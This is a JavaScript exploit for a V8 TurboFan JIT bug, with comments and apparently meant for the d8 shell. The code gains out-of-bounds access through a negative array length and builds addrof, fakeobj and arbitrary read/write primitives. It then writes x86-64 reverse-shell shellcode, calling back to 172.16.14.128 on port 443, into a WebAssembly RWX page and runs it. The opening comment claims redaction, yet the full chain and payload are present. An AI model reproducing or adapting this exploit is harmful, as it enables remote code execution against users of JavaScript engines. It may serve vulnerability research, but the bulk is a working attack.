/* 
This version of the exploit has redacted features including abort check 
functions and shellcode, as well as, altering execution flow, including 
payload delivery and specification. It can, however, be ran against ./d8 
directly for testing & debugging. 
*/

//define clean exit 'abort' function
function abort(msg) {
  throw new Error(msg);
}

function exploit() {
  // Helper functions to convert between float and integer primitives
  var buf = new ArrayBuffer(8); // 8 byte array buffer
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
  }

  function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
  }

  //trigger bug with typer hardening bypass
  function foo(a) {
    //MAX_INT of 32-bit signed integer.
    var y = 0x7fffffff;
    //Widening condition to fail the first `if` clause inside VisitSpeculativeIntegerAdditiveOp (SpecualtiveSafeIntegerAdd node).
    if (a == NaN) y = NaN;
    if (a) y = -1;
    let z = (y + 1) | 0;
    //should return false, but got true.
    z = (0x80000000 == z);
    if (a) z = -1;
    let l = Math.sign(z);
    l = l < 0 ? 0 : l;

    /*
    TurboFan interprets z is a + num, but it is actually a - number,
    which satisfies the usage conditions of the arr.shift(); trick.
    */

    //real value: 1, optimiser: Range(-1, 0)
    let arr = new Array(l);

    // arr.length = -1, leads to oob
    arr.shift();

    //creating cor array
    let cor = [1.1, 1.2, 1.3];
    return [arr, cor];
  }

  // JIT-compiling the trigger foo(); function for optimisation.
  for (let i = 0; i < 0x10000; i++)
    foo(true);
  console.log('[process] optimising the function to trigger the bug');

  const ret = foo(false);
  var arr = ret[0];
  var cor = ret[1];

  //Make sure returned arr.length is -1, otherwise exit cleanly as would indicate a fail to attain OOB.
  if (arr.length >= 0) {
    abort('[error] failed to attain out-of-bounds, exploit failed from bad array length')
  } else {
    console.log('[success] out-of-bounds plausible, obtained a negative array length')
  }

  //oob r/w functions
  console.log('[process] attempting to overwrite the length of the corrupted array');

  //we use the original OOB array (arr) to corrupt the length of the 'cor' array.
  arr[16] = 0x4242; //overwrites the cor array length for OOB read (16962)

  //make sure returned cor.length has been overwritten, otherwise exit.
  if (cor.length < 16962) {
    abort('[error] failed to overwrite the length of the second array.');
  } else {
    console.log('[success] length of second array overwritten to ' + cor.length);
  }

  // leak float_array_map
  let float_array_map = ftoi(cor[3]);
  console.log(`[success] leaked corrupted array map at: 0x${float_array_map.toString(16)}`);

  //addrof primitive - takes an object and returns its address in memory.
  function addrof(obj) {
    arr[11] = obj;
    return ftoi(cor[2]);
  }

  //fakeobj primitive - create an object in memory which we can r/w to.
  function fakeobj(addr) {
    cor[2] = itof(addr);
    return arr[11];
  }

  //for arbitrary read/write
  rw_arr = [itof(float_array_map), 1.1, 1.2, 1.3]
  fake = fakeobj(addrof(rw_arr) + 0x20n);

  //arb_read primitive
  function arb_read(addr) {
    fake = fakeobj(addrof(rw_arr) + 0x20n);
    rw_arr[1] = itof((0x12n << 32n) + (addr += 1n) - 0x8n);
    return ftoi(fake[0]);
  }

  //arb_write primitive
  function arb_write(addr, val) {
    fake = fakeobj(addrof(rw_arr) + 0x20n);
    rw_arr[1] = itof((0x12n << 32n) + (addr += 1n) - 0x8n);
    fake[0] = itof(val);
    return;
  }

  //creating an rwx segment
  var wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01,
    0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x04, 0x84, 0x80,
    0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00,
    0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02,
    0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00,
    0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41,
    0x2a, 0x0b
  ]);

  var wasmModule = new WebAssembly.Module(wasmCode);
  var wasmInstance = new WebAssembly.Instance(wasmModule, {});
  var wasm_entry = wasmInstance.exports.main;

  let rwx = arb_read(addrof(wasmInstance) + 0x67n);
  console.log(`[success] rwx web assembly segment created at 0x${rwx}`);

  console.log('[process] staging the static payloads');

  //writing shellcode to rwx
  function write(buf) {
    let tmp = new ArrayBuffer(buf.length);
    let view = new DataView(tmp);
    let backing_store_addr = addrof(tmp) + 0x13n; 
    arb_write(backing_store_addr, rwx);
    for (let i = 0; i < buf.length; i++) {
      view.setUint8(i, buf[i]);
    }
  }

  //reverse linux tcp shell payload: 172.16.14.128 (tcp\443)
  var shellcode = new Uint8Array([
      0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a,
      0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9,
      0x02, 0x00, 0x01, 0xbb, 0xac, 0x10, 0x0e, 0x80,
      0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a,
      0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48,
      0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
      0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f,
      0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
      0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6,
      0x0f, 0x05
  ]);

//write shellcode for it to be executed in memory
write(shellcode);
wasm_entry();
}
setTimeout(exploit, 1500);
